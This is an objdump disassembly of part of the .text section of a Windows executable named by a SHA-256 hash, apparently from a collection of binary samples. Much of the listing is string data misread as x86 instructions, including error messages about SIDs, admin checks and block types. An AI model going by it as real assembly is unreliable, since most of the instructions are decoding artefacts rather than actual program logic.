
074f238eaecb13d1c6304ead46c31ceca7e8f56d4c6d2d53b91d849efb539cd2.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	add    BYTE PTR [eax],al
  401002:	add    BYTE PTR [eax],al
  401004:	mov    al,ds:0xf0004070
  401009:	sub    eax,0x2e200040
  40100e:	inc    eax
  40100f:	add    BYTE PTR [eax],dh
  401011:	cs inc eax
	...
  40101b:	add    al,dl
  40101d:	outs   dx,DWORD PTR ds:[esi]
  40101e:	inc    eax
  40101f:	add    BYTE PTR [eax+0x74],dl
  401022:	inc    eax
  401023:	add    BYTE PTR [eax],al
  401025:	add    BYTE PTR [eax],al
  401027:	add    BYTE PTR [eax],al
  401029:	sub    al,0x0
  40102b:	add    al,dh
  40102d:	sub    eax,0x2e200000
  401032:	add    BYTE PTR [eax],al
  401034:	xor    BYTE PTR [esi],ch
  401036:	add    BYTE PTR [eax],al
  401038:	nop
  401039:	xor    eax,0x3f100000
  40103e:	add    BYTE PTR [eax],al
  401040:	xor    BYTE PTR [edi],bh
  401042:	add    BYTE PTR [eax],al
  401044:	rcr    BYTE PTR [esi+0x0],1
  401047:	add    BYTE PTR [eax+0x6f],ah
  40104a:	add    BYTE PTR [eax],al
  40104c:	nop
  40104d:	outs   dx,DWORD PTR ds:[esi]
  40104e:	add    BYTE PTR [eax],al
  401050:	mov    al,ds:0xb000006f
  401055:	outs   dx,DWORD PTR ds:[esi]
  401056:	add    BYTE PTR [eax],al
  401058:	shr    BYTE PTR [edi+0x0],1
  40105b:	add    BYTE PTR [eax+0x20000070],ah
  401061:	jae    0x401063
  401063:	add    BYTE PTR [eax],dh
  401065:	jae    0x401067
  401067:	add    BYTE PTR [eax],al
  401069:	je     0x40106b
  40106b:	add    BYTE PTR [eax+0x74],dl
  40106e:	add    BYTE PTR [eax],al
  401070:	xor    BYTE PTR [ebp+0x0],dh
  401073:	add    al,al
  401075:	ja     0x401077
  401077:	add    al,dh
  401079:	ja     0x40107b
  40107b:	add    al,dl
  40107d:	jns    0x40107f
  40107f:	add    BYTE PTR [eax],al
  401081:	jp     0x401083
  401083:	add    BYTE PTR [eax],dh
  401085:	jp     0x401087
  401087:	add    BYTE PTR [eax-0x5fffff84],dl
  40108d:	jl     0x40108f
  40108f:	add    al,al
  401091:	jl     0x401093
	...
  40109f:	add    BYTE PTR [ebp+0x53],dl
  4010a2:	inc    ebp
  4010a3:	push   edx
  4010a4:	xor    esi,DWORD PTR [edx]
  4010a6:	cs fs ins BYTE PTR es:[edi],dx
  4010a9:	ins    BYTE PTR es:[edi],dx
  4010aa:	add    BYTE PTR [eax],al
  4010ac:	js     0x40103e
  4010ae:	inc    eax
  4010af:	add    al,cl
  4010b1:	nop
  4010b2:	inc    eax
	...
  4010bf:	add    BYTE PTR [ebx+0x48],dl
  4010c2:	dec    esp
  4010c3:	push   edi
  4010c4:	inc    ecx
  4010c5:	push   eax
  4010c6:	dec    ecx
  4010c7:	cs fs ins BYTE PTR es:[edi],dx
  4010ca:	ins    BYTE PTR es:[edi],dx
  4010cb:	add    BYTE PTR [eax],al
  4010cd:	add    BYTE PTR [eax],al
  4010cf:	add    BYTE PTR [ebx+0x48],dl
  4010d2:	inc    ebp
  4010d3:	dec    esp
  4010d4:	dec    esp
  4010d5:	xor    esi,DWORD PTR [edx]
  4010d7:	cs fs ins BYTE PTR es:[edi],dx
  4010da:	ins    BYTE PTR es:[edi],dx
  4010db:	add    BYTE PTR [eax],ch
  4010dd:	add    BYTE PTR [esi+0x0],ch
  4010e0:	jne    0x4010e2
  4010e2:	ins    BYTE PTR es:[edi],dx
  4010e3:	add    BYTE PTR [eax+eax*1+0x29],ch
	...
  4010ef:	add    bh,bh
  4010f1:	jg     0x4010f3
  4010f3:	adc    BYTE PTR [edx],al
  4010f5:	add    BYTE PTR [eax],al
  4010f7:	add    BYTE PTR [eax],al
  4010f9:	add    al,BYTE PTR [eax]
  4010fb:	add    BYTE PTR [eax],al
  4010fd:	add    BYTE PTR [eax],al
  4010ff:	xor    BYTE PTR [ecx+0x4e],0xf5
  401103:	out    dx,al
  401104:	popa   
  401105:	push   es
  401106:	sub    eax,0x82989a42
  40110b:	std    
  40110c:	dec    ecx
  40110d:	inc    eax
  40110e:	mov    eax,0x69614620
  401113:	ins    BYTE PTR es:[edi],dx
  401114:	gs and BYTE PTR fs:[edi+ebp*2+0x20],dh
  40111a:	popa   
  40111b:	ins    BYTE PTR es:[edi],dx
  40111c:	ins    BYTE PTR es:[edi],dx
  40111d:	outs   dx,DWORD PTR ds:[esi]
  40111e:	arpl   WORD PTR [ecx+0x74],sp
  401121:	and    BYTE PTR gs:[ebp+0x65],ch
  401125:	ins    DWORD PTR es:[edi],dx
  401126:	outs   dx,DWORD PTR ds:[esi]
  401127:	jb     0x4011a2
  401129:	and    BYTE PTR [esi+0x6f],ah
  40112c:	jb     0x40114e
  40112e:	imul   ebp,DWORD PTR [esi+0x74],0x63617265
  401135:	je     0x4011a0
  401137:	jbe    0x40119e
  401139:	and    BYTE PTR [ebx+0x49],dl
  40113c:	inc    esp
  40113d:	add    BYTE PTR [eax],al
  40113f:	add    BYTE PTR [ebx+0x68],al
  401142:	arpl   WORD PTR gs:[ebx+0x55],bp
  401146:	jae    0x4011ad
  401148:	jb     0x40119e
  40114a:	outs   dx,DWORD PTR ds:[esi]
  40114b:	imul   esp,DWORD PTR [ebp+0x6e],0x0
  40114f:	add    BYTE PTR [esi+0x61],al
  401152:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  40115a:	arpl   WORD PTR [edx+0x65],si
  40115d:	popa   
  40115e:	je     0x4011c5
  401160:	and    BYTE PTR [ecx+0x6e],ch
  401163:	je     0x4011ca
  401165:	jb     0x4011c8
  401167:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  40116b:	and    BYTE PTR gs:[ebx+0x49],dl
  40116f:	inc    esp
  401170:	and    BYTE PTR [ebx+0x25],bl
  401173:	fs pop ebp
  401175:	add    BYTE PTR [eax],al
  401177:	add    BYTE PTR [esi+0x61],al
  40117a:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  401182:	fs gs je 0x4011eb
  401186:	jb     0x4011f5
  401188:	imul   ebp,DWORD PTR [esi+0x65],0x20666920
  40118f:	jne    0x401204
  401191:	gs jb  0x4011b4
  401194:	imul   esi,DWORD PTR [ebx+0x20],0x65746e69
  40119b:	jb     0x4011fe
  40119d:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  4011a1:	and    BYTE PTR gs:[ebx+0x25],bl
  4011a5:	fs pop ebp
  4011a7:	add    BYTE PTR [esi+0x61],al
  4011aa:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  4011b2:	addr16 gs je 0x4011d6
  4011b6:	jo     0x40122a
  4011b8:	outs   dx,DWORD PTR ds:[esi]
  4011b9:	arpl   WORD PTR [ebp+0x73],sp
  4011bc:	jae    0x4011de
  4011be:	ja     0x401229
  4011c0:	outs   dx,BYTE PTR ds:[esi]
  4011c1:	outs   dx,DWORD PTR fs:[esi]
  4011c3:	ja     0x4011e5
  4011c5:	jae    0x40123b
  4011c7:	popa   
  4011c8:	je     0x401233
  4011ca:	outs   dx,DWORD PTR ds:[esi]
  4011cb:	outs   dx,BYTE PTR ds:[esi]
  4011cc:	and    BYTE PTR [ebx+0x25],bl
  4011cf:	fs pop ebp
  4011d1:	add    BYTE PTR [eax],al
  4011d3:	add    BYTE PTR [ebx+0x68],al
  4011d6:	arpl   WORD PTR gs:[ebx+0x57],bp
  4011da:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  4011e1:	popa   
  4011e2:	je     0x40124d
  4011e4:	outs   dx,DWORD PTR ds:[esi]
  4011e5:	outs   dx,BYTE PTR ds:[esi]
  4011e6:	add    BYTE PTR [eax],al
  4011e8:	inc    esi
  4011e9:	popa   
  4011ea:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  4011f2:	addr16 gs je 0x401216
  4011f6:	jb     0x40125d
  4011f8:	jno    0x40126f
  4011fa:	imul   esi,DWORD PTR [edx+0x65],0x75622064
  401201:	data16 data16 gs jb 0x401226
  401206:	jae    0x401271
  401208:	jp     0x40126f
  40120a:	and    BYTE PTR [ebx+0x25],bl
  40120d:	fs pop ebp
  40120f:	add    BYTE PTR [esi+0x61],al
  401212:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  40121a:	popa   
  40121b:	ins    BYTE PTR es:[edi],dx
  40121c:	ins    BYTE PTR es:[edi],dx
  40121d:	outs   dx,DWORD PTR ds:[esi]
  40121e:	arpl   WORD PTR [ecx+0x74],sp
  401221:	and    BYTE PTR gs:0x79622064,ah
  401228:	je     0x40128f
  40122a:	jae    0x40124c
  40122c:	outs   dx,WORD PTR ds:[esi]
  40122e:	jb     0x401250
  401230:	ja     0x40129b
  401232:	outs   dx,BYTE PTR ds:[esi]
  401233:	outs   dx,DWORD PTR fs:[esi]
  401235:	ja     0x401257
  401237:	jae    0x4012ad
  401239:	popa   
  40123a:	je     0x4012a5
  40123c:	outs   dx,DWORD PTR ds:[esi]
  40123d:	outs   dx,BYTE PTR ds:[esi]
  40123e:	and    BYTE PTR [esi+0x61],ch
  401241:	ins    DWORD PTR es:[edi],dx
  401242:	add    BYTE PTR gs:[esi+0x61],al
  401246:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  40124e:	addr16 gs je 0x401272
  401252:	jne    0x4012c7
  401254:	gs jb  0x401277
  401257:	outs   dx,DWORD PTR ds:[esi]
  401258:	bound  ebp,QWORD PTR [edx+0x65]
  40125b:	arpl   WORD PTR [eax+eiz*1+0x69],si
  40125f:	outs   dx,BYTE PTR ds:[esi]
  401260:	outs   dx,WORD PTR ds:[esi]
  401262:	jb     0x4012d1
  401264:	popa   
  401265:	je     0x4012d0
  401267:	outs   dx,DWORD PTR ds:[esi]
  401268:	outs   dx,BYTE PTR ds:[esi]
  401269:	and    BYTE PTR [ebx+0x25],bl
  40126c:	fs pop ebp
  40126e:	add    BYTE PTR [eax],al
  401270:	push   edi
  401271:	add    BYTE PTR [ecx+0x0],ch
  401274:	outs   dx,BYTE PTR ds:[esi]
  401275:	add    BYTE PTR [ebx+0x0],dh
  401278:	je     0x40127a
  40127a:	popa   
  40127b:	add    BYTE PTR [eax],dh
  40127d:	add    BYTE PTR [eax],al
  40127f:	add    BYTE PTR [ecx+0x70],al
  401282:	jo     0x4012ec
  401284:	gs ins BYTE PTR es:[edi],dx
  401286:	jo     0x4012a8
  401288:	push   ebp
  401289:	dec    ecx
  40128a:	and    BYTE PTR [edi+0x69],dh
  40128d:	ins    BYTE PTR es:[edi],dx
  40128e:	ins    BYTE PTR es:[edi],dx
  40128f:	and    BYTE PTR [esi+0x6f],ch
  401292:	je     0x4012b4
  401294:	bound  esp,QWORD PTR [ebp+0x20]
  401297:	jae    0x401301
  401299:	outs   dx,DWORD PTR ds:[esi]
  40129a:	ja     0x40130a
  40129c:	cmp    esp,DWORD PTR [eax]
  40129e:	ja     0x401309
  4012a0:	outs   dx,BYTE PTR ds:[esi]
  4012a1:	outs   dx,DWORD PTR fs:[esi]
  4012a3:	ja     0x4012c5
  4012a5:	jae    0x40131b
  4012a7:	popa   
  4012a8:	je     0x401313
  4012aa:	outs   dx,DWORD PTR ds:[esi]
  4012ab:	outs   dx,BYTE PTR ds:[esi]
  4012ac:	cmp    ah,BYTE PTR [eax]
  4012ae:	and    eax,0x736c
  4012b3:	add    BYTE PTR [eax],al
  4012b5:	add    BYTE PTR [eax],al
  4012b7:	add    BYTE PTR [ecx+0x70],al
  4012ba:	jo     0x401324
  4012bc:	gs ins BYTE PTR es:[edi],dx
  4012be:	jo     0x4012e0
  4012c0:	push   ebp
  4012c1:	dec    ecx
  4012c2:	and    BYTE PTR [edi+0x69],dh
  4012c5:	ins    BYTE PTR es:[edi],dx
  4012c6:	ins    BYTE PTR es:[edi],dx
  4012c7:	and    BYTE PTR [edx+0x65],ah
  4012ca:	and    BYTE PTR [ebx+0x68],dh
  4012cd:	outs   dx,DWORD PTR ds:[esi]
  4012ce:	ja     0x40133e
  4012d0:	cmp    esp,DWORD PTR [eax]
  4012d2:	jb     0x401349
  4012d4:	outs   dx,BYTE PTR ds:[esi]
  4012d5:	outs   dx,BYTE PTR ds:[esi]
  4012d6:	imul   ebp,DWORD PTR [esi+0x67],0x206e6920
  4012dd:	imul   ebp,DWORD PTR [esi+0x74],0x63617265
  4012e4:	je     0x40134f
  4012e6:	jbe    0x40134d
  4012e8:	and    BYTE PTR [edi+0x69],dh
  4012eb:	outs   dx,BYTE PTR ds:[esi]
  4012ec:	outs   dx,DWORD PTR fs:[esi]
  4012ee:	ja     0x401310
  4012f0:	jae    0x401366
  4012f2:	popa   
  4012f3:	je     0x40135e
  4012f5:	outs   dx,DWORD PTR ds:[esi]
  4012f6:	outs   dx,BYTE PTR ds:[esi]
  4012f7:	add    BYTE PTR [eax+0x0],dh
  4012fa:	arpl   WORD PTR [eax],ax
  4012fc:	popa   
  4012fd:	add    BYTE PTR [ebp+0x0],dh
  401300:	imul   eax,DWORD PTR [eax],0x64002e
  401306:	ins    BYTE PTR es:[edi],dx
  401307:	add    BYTE PTR [eax+eax*1+0x0],ch
  40130b:	add    BYTE PTR [eax+0x0],dh
  40130e:	add    BYTE PTR ds:[eax],al
  401311:	add    BYTE PTR [eax],al
  401313:	add    BYTE PTR [edi],ch
  401315:	add    BYTE PTR [eax+0x0],dh
  401318:	add    BYTE PTR ds:[eax],al
  40131b:	add    BYTE PTR [eax+0x0],dh
  40131e:	das    
  40131f:	add    BYTE PTR [esi],bh
  401321:	add    BYTE PTR [eax],al
  401323:	add    BYTE PTR [edx+0x0],ah
  401326:	jb     0x401328
  401328:	add    BYTE PTR ds:[eax],al
  40132b:	add    BYTE PTR [edi],ch
  40132d:	add    BYTE PTR [edx+0x0],ah
  401330:	jb     0x401332
  401332:	add    BYTE PTR ds:[eax],al
  401335:	add    BYTE PTR [eax],al
  401337:	add    BYTE PTR [edx+0x0],ah
  40133a:	jb     0x40133c
  40133c:	das    
  40133d:	add    BYTE PTR [esi],bh
  40133f:	add    BYTE PTR [eax],al
  401341:	add    BYTE PTR [eax],al
  401343:	add    BYTE PTR [eax+0x0],dh
  401346:	and    BYTE PTR [eax],al
  401348:	das    
  401349:	add    BYTE PTR [esi],bh
  40134b:	add    BYTE PTR [eax],al
  40134d:	add    BYTE PTR [eax],al
  40134f:	add    BYTE PTR [eax],dh
  401351:	js     0x401378
  401353:	ins    BYTE PTR es:[edi],dx
  401354:	js     0x401376
  401356:	inc    esi
  401357:	popa   
  401358:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  401360:	arpl   WORD PTR [edi+0x6e],bp
  401363:	jbe    0x4013ca
  401365:	jb     0x4013db
  401367:	and    BYTE PTR [edi],ah
  401369:	and    eax,0x2027736c
  40136e:	je     0x4013df
  401370:	and    BYTE PTR [edi+0x55],al
  401373:	dec    ecx
  401374:	inc    esp
  401375:	add    BYTE PTR [eax],al
  401377:	add    BYTE PTR [ebx+0x68],dl
  40137a:	outs   dx,DWORD PTR ds:[esi]
  40137b:	ja     0x4013be
  40137d:	jo     0x4013ef
  40137f:	push   0x44706c65
  401384:	imul   esp,DWORD PTR [ecx+0x6c],0x676f
  40138b:	add    BYTE PTR [ecx+0x70],al
  40138e:	jo     0x4013f8
  401390:	gs ins BYTE PTR es:[edi],dx
  401392:	jo     0x4013b4
  401394:	imul   esi,DWORD PTR fs:[ebx+0x61],0x64656c62
  40139c:	and    BYTE PTR [esi+0x6f],ah
  40139f:	jb     0x4013c1
  4013a1:	daa    
  4013a2:	and    eax,0x27736c
  4013a7:	add    BYTE PTR [esi+0x6f],cl
  4013aa:	je     0x4013cc
  4013ac:	imul   esi,DWORD PTR fs:[ebx+0x70],0x6979616c
  4013b4:	outs   dx,BYTE PTR ds:[esi]
  4013b5:	and    BYTE PTR [di+0x49],dl
  4013b9:	and    BYTE PTR [esi+0x6f],ah
  4013bc:	jb     0x4013de
  4013be:	daa    
  4013bf:	and    eax,0x736c
  4013c4:	inc    esi
  4013c5:	popa   
  4013c6:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  4013ce:	jb     0x401435
  4013d0:	je     0x401444
  4013d2:	imul   esp,DWORD PTR [ebp+0x76],0x6f6d2065
  4013d9:	fs jne 0x401448
  4013dc:	and    BYTE PTR gs:[eax+0x61],ch
  4013e0:	outs   dx,BYTE PTR ds:[esi]
  4013e1:	fs ins BYTE PTR es:[edi],dx
  4013e3:	and    BYTE PTR gs:[esi+0x6f],ah
  4013e7:	jb     0x401409
  4013e9:	push   eax
  4013ea:	inc    ebx
  4013eb:	inc    ecx
  4013ec:	and    BYTE PTR [eax+0x65],ch
  4013ef:	ins    BYTE PTR es:[edi],dx
  4013f0:	jo     0x401457
  4013f2:	jb     0x4013f4
  4013f4:	inc    esp
  4013f5:	imul   esi,DWORD PTR [ebx+0x70],0x4179616c
  4013fc:	jo     0x40146e
  4013fe:	push   0x44706c65
  401403:	imul   esp,DWORD PTR [ecx+0x6c],0x676f
  40140a:	add    BYTE PTR [eax],al
  40140c:	add    BYTE PTR [eax],al
  40140e:	add    BYTE PTR [eax],al
  401410:	push   edi
  401411:	add    BYTE PTR [ecx+0x0],ch
  401414:	outs   dx,BYTE PTR ds:[esi]
  401415:	add    BYTE PTR [eax+eax*1+0x6f],ah
  401419:	add    BYTE PTR [edi+0x0],dh
  40141c:	jae    0x40141e
  40141e:	add    BYTE PTR cs:[ebp+0x0],dl
  401422:	dec    ecx
  401423:	add    BYTE PTR [esi],ch
  401425:	add    BYTE PTR [esi+0x0],cl
  401428:	outs   dx,DWORD PTR ds:[esi]
  401429:	add    BYTE PTR [eax+eax*1+0x69],dh
  40142d:	add    BYTE PTR [esi+0x0],ah
  401430:	imul   eax,DWORD PTR [eax],0x610063
  401436:	je     0x401438
  401438:	imul   eax,DWORD PTR [eax],0x6e006f
  40143e:	jae    0x401440
  401440:	add    BYTE PTR cs:[eax+eax*1+0x6f],dl
  401445:	add    BYTE PTR [ecx+0x0],ah
  401448:	jae    0x40144a
  40144a:	je     0x40144c
  40144c:	dec    esi
  40144d:	add    BYTE PTR [edi+0x0],ch
  401450:	je     0x401452
  401452:	imul   eax,DWORD PTR [eax],0x690066
  401458:	arpl   WORD PTR [eax],ax
  40145a:	popa   
  40145b:	add    BYTE PTR [eax+eax*1+0x69],dh
  40145f:	add    BYTE PTR [edi+0x0],ch
  401462:	outs   dx,BYTE PTR ds:[esi]
  401463:	add    BYTE PTR [ebp+0x0],cl
  401466:	popa   
  401467:	add    BYTE PTR [esi+0x0],ch
  40146a:	popa   
  40146b:	add    BYTE PTR [edi+0x0],ah
  40146e:	add    BYTE PTR gs:[edx+0x0],dh
  401472:	add    BYTE PTR [eax],al
  401474:	pop    ecx
  401475:	sbb    eax,0x21221c74
  40147a:	aad    0x47
  40147c:	test   al,0x56
  40147e:	xor    ebx,0xffffffd4
  401481:	and    DWORD PTR [eax+0x75],ecx
  401484:	add    BYTE PTR [eax],al
  401486:	add    BYTE PTR [eax],al
  401488:	push   edi
  401489:	add    BYTE PTR [ecx+0x0],ch
  40148c:	outs   dx,BYTE PTR ds:[esi]
  40148d:	add    BYTE PTR [eax+eax*1+0x6f],ah
  401491:	add    BYTE PTR [edi+0x0],dh
  401494:	jae    0x401496
  401496:	add    BYTE PTR cs:[ebp+0x0],dl
  40149a:	dec    ecx
  40149b:	add    BYTE PTR [esi],ch
  40149d:	add    BYTE PTR [esi+0x0],cl
  4014a0:	outs   dx,DWORD PTR ds:[esi]
  4014a1:	add    BYTE PTR [eax+eax*1+0x69],dh
  4014a5:	add    BYTE PTR [esi+0x0],ah
  4014a8:	imul   eax,DWORD PTR [eax],0x610063
  4014ae:	je     0x4014b0
  4014b0:	imul   eax,DWORD PTR [eax],0x6e006f
  4014b6:	jae    0x4014b8
  4014b8:	add    BYTE PTR cs:[eax+eax*1+0x6f],dl
  4014bd:	add    BYTE PTR [ecx+0x0],ah
  4014c0:	jae    0x4014c2
  4014c2:	je     0x4014c4
  4014c4:	dec    esi
  4014c5:	add    BYTE PTR [edi+0x0],ch
  4014c8:	je     0x4014ca
  4014ca:	imul   eax,DWORD PTR [eax],0x690066
  4014d0:	arpl   WORD PTR [eax],ax
  4014d2:	popa   
  4014d3:	add    BYTE PTR [eax+eax*1+0x69],dh
  4014d7:	add    BYTE PTR [edi+0x0],ch
  4014da:	outs   dx,BYTE PTR ds:[esi]
  4014db:	add    BYTE PTR [eax],al
  4014dd:	add    BYTE PTR [eax],al
  4014df:	add    ah,bh
  4014e1:	jg     0x4014e3
  4014e3:	adc    BYTE PTR [eax+eax*1],al
  4014e6:	add    BYTE PTR [eax],al
  4014e8:	add    BYTE PTR [edx],al
  4014ea:	add    BYTE PTR [eax],al
  4014ec:	add    BYTE PTR [eax],al
  4014ee:	add    BYTE PTR [eax+0x4124b20],al
  4014f4:	mov    BYTE PTR [edx+0x9b14229],0xfd
  4014fb:	sahf   
  4014fc:	aam    0x66
  4014fe:	sub    edx,DWORD PTR [ebx+0x3f]
  401501:	adc    BYTE PTR [eax+edx*2+0x4598d235],ch
  401508:	mov    ebx,0x4dfe98ef
  40150d:	sbb    bh,BYTE PTR [edx]
  40150f:	aam    0xa4
  401511:	dec    edx
  401512:	adc    al,0xac
  401514:	icebp  
  401515:	mov    ah,0xb6
  401517:	dec    ebp
  401518:	mov    dl,0x6
  40151a:	mov    ah,BYTE PTR [edx]
  40151c:	ret    
  40151d:	or     bl,bl
  40151f:	or     dh,BYTE PTR [eax+0x63]
  401522:	popa   
  401523:	jne    0x40158e
  401525:	add    BYTE PTR [eax],al
  401527:	add    BYTE PTR [eax],dh
  401529:	js     0x401550
  40152b:	xor    BYTE PTR [eax],bh
  40152d:	pop    eax
  40152e:	and    BYTE PTR [esi+0x61],al
  401531:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  401539:	fs gs je 0x4015a2
  40153d:	jb     0x4015ac
  40153f:	imul   ebp,DWORD PTR [esi+0x65],0x67726120
  401546:	jne    0x4015b5
  401548:	outs   dx,BYTE PTR gs:[esi]
  40154a:	je     0x40156c
  40154c:	ins    BYTE PTR es:[edi],dx
  40154d:	outs   dx,BYTE PTR gs:[esi]
  40154f:	addr16 je 0x4015ba
  401552:	add    BYTE PTR [eax],al
  401554:	push   ebx
  401555:	je     0x4015c6
  401557:	jb     0x4015be
  401559:	inc    ecx
  40155a:	jb     0x4015c3
  40155c:	jne    0x4015cb
  40155e:	outs   dx,BYTE PTR gs:[esi]
  401560:	je     0x401562
  401562:	add    BYTE PTR [eax],al
  401564:	inc    esi
  401565:	popa   
  401566:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  40156e:	popa   
  40156f:	ins    BYTE PTR es:[edi],dx
  401570:	ins    BYTE PTR es:[edi],dx
  401571:	outs   dx,DWORD PTR ds:[esi]
  401572:	arpl   WORD PTR [ecx+0x74],sp
  401575:	and    BYTE PTR gs:[ecx+0x72],ah
  401579:	addr16 jne 0x4015e9
  40157c:	outs   dx,BYTE PTR gs:[esi]
  40157e:	je     0x401580
  401580:	inc    esi
  401581:	popa   
  401582:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  40158a:	jae    0x401600
  40158c:	outs   dx,DWORD PTR ds:[esi]
  40158d:	jb     0x4015f4
  40158f:	and    BYTE PTR [ebx+0x6f],ah
  401592:	ins    DWORD PTR es:[edi],dx
  401593:	ins    DWORD PTR es:[edi],dx
  401594:	popa   
  401595:	outs   dx,BYTE PTR ds:[esi]
  401596:	fs sub eax,0x656e696c
  40159c:	and    BYTE PTR [ecx+0x72],ah
  40159f:	addr16 jne 0x40160f
  4015a2:	outs   dx,BYTE PTR gs:[esi]
  4015a4:	je     0x4015a6
  4015a6:	add    BYTE PTR [eax],al
  4015a8:	inc    esi
  4015a9:	popa   
  4015aa:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  4015b2:	outs   dx,DWORD PTR ds:[esi]
  4015b3:	bound  esi,QWORD PTR [ecx+eiz*2+0x69]
  4015b7:	outs   dx,BYTE PTR ds:[esi]
  4015b8:	and    BYTE PTR [ebx+0x6f],ah
  4015bb:	ins    DWORD PTR es:[edi],dx
  4015bc:	ins    DWORD PTR es:[edi],dx
  4015bd:	popa   
  4015be:	outs   dx,BYTE PTR ds:[esi]
  4015bf:	fs sub eax,0x656e696c
  4015c5:	add    BYTE PTR [eax],al
  4015c7:	add    BYTE PTR [eax+0x61],dl
  4015ca:	jb     0x40163f
  4015cc:	gs inc ebx
  4015ce:	outs   dx,DWORD PTR ds:[esi]
  4015cf:	ins    DWORD PTR es:[edi],dx
  4015d0:	ins    DWORD PTR es:[edi],dx
  4015d1:	popa   
  4015d2:	outs   dx,BYTE PTR ds:[esi]
  4015d3:	fs dec esp
  4015d5:	imul   ebp,DWORD PTR [esi+0x65],0x0
  4015dc:	inc    esi
  4015dd:	popa   
  4015de:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  4015e6:	jae    0x40165c
  4015e8:	outs   dx,DWORD PTR ds:[esi]
  4015e9:	jb     0x401650
  4015eb:	and    BYTE PTR [ecx+0x70],ah
  4015ee:	jo     0x401610
  4015f0:	outs   dx,BYTE PTR ds:[esi]
  4015f1:	popa   
  4015f2:	ins    DWORD PTR es:[edi],dx
  4015f3:	and    BYTE PTR gs:[ecx+0x72],ah
  4015f7:	addr16 jne 0x401667
  4015fa:	outs   dx,BYTE PTR gs:[esi]
  4015fc:	je     0x4015fe
  4015fe:	add    BYTE PTR [eax],al
  401600:	inc    esi
  401601:	popa   
  401602:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  40160a:	jo     0x40166d
  40160c:	jb     0x401681
  40160e:	and    BYTE PTR gs:[edx+0x6c],ah
  401612:	outs   dx,DWORD PTR ds:[esi]
  401613:	arpl   WORD PTR [ebx+0x20],bp
  401616:	je     0x401691
  401618:	jo     0x40167f
  40161a:	and    BYTE PTR [ecx+0x72],ah
  40161d:	addr16 jne 0x40168d
  401620:	outs   dx,BYTE PTR gs:[esi]
  401622:	je     0x401624
  401624:	inc    esi
  401625:	popa   
  401626:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  40162e:	jae    0x4016a4
  401630:	outs   dx,DWORD PTR ds:[esi]
  401631:	jb     0x401698
  401633:	and    BYTE PTR [edx+0x6c],ah
  401636:	outs   dx,DWORD PTR ds:[esi]
  401637:	arpl   WORD PTR [ebx+0x20],bp
  40163a:	je     0x4016b5
  40163c:	jo     0x4016a3
  40163e:	add    BYTE PTR [eax],al
  401640:	dec    ecx
  401641:	outs   dx,BYTE PTR ds:[esi]
  401642:	jbe    0x4016a5
  401644:	ins    BYTE PTR es:[edi],dx
  401645:	imul   esp,DWORD PTR [eax+eiz*1+0x62],0x6b636f6c
  40164d:	and    BYTE PTR [ecx+edi*2+0x70],dh
  401651:	add    BYTE PTR gs:[eax],al
  401654:	inc    esi
  401655:	popa   
  401656:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  40165e:	jo     0x4016c1
  401660:	jb     0x4016d5
  401662:	and    BYTE PTR gs:[ebp+0x78],ah
  401666:	arpl   WORD PTR gs:[ebp+0x74],si
  40166a:	popa   
  40166b:	bound  ebp,QWORD PTR [ebp+eiz*2+0x20]
  40166f:	jo     0x4016d2
  401671:	je     0x4016db
  401673:	and    BYTE PTR [ecx+0x72],ah
  401676:	addr16 jne 0x4016e6
  401679:	outs   dx,BYTE PTR gs:[esi]
  40167b:	je     0x40167d
  40167d:	add    BYTE PTR [eax],al
  40167f:	add    BYTE PTR [esi+0x61],al
  401682:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  40168a:	jae    0x401700
  40168c:	outs   dx,DWORD PTR ds:[esi]
  40168d:	jb     0x4016f4
  40168f:	and    BYTE PTR [ebp+0x78],ah
  401692:	arpl   WORD PTR gs:[ebp+0x74],si
  401696:	popa   
  401697:	bound  ebp,QWORD PTR [ebp+eiz*2+0x20]
  40169b:	jo     0x4016fe
  40169d:	je     0x401707
  40169f:	add    BYTE PTR [esi+0x61],al
  4016a2:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  4016aa:	jo     0x40171e
  4016ac:	popa   
  4016ad:	jae    0x401714
  4016af:	and    BYTE PTR [esi+0x57],al
  4016b2:	dec    esp
  4016b3:	imul   ebp,DWORD PTR [esi+0x6b],0x20646920
  4016ba:	popa   
  4016bb:	jb     0x401724
  4016bd:	jne    0x40172c
  4016bf:	outs   dx,BYTE PTR gs:[esi]
  4016c1:	je     0x4016c3
  4016c3:	add    BYTE PTR [esi+0x61],al
  4016c6:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  4016ce:	jo     0x401731
  4016d0:	jb     0x401745
  4016d2:	and    BYTE PTR gs:[ecx+eiz*2+0x74],ah
  4016d7:	popa   
  4016d8:	bound  esp,QWORD PTR [ecx+0x73]
  4016db:	and    BYTE PTR gs:[edi+0x55],al
  4016df:	dec    ecx
  4016e0:	inc    esp
  4016e1:	and    BYTE PTR [ecx+0x72],ah
  4016e4:	addr16 jne 0x401754
  4016e7:	outs   dx,BYTE PTR gs:[esi]
  4016e9:	je     0x4016eb
  4016eb:	add    BYTE PTR [esi+0x61],al
  4016ee:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  4016f6:	jae    0x40176c
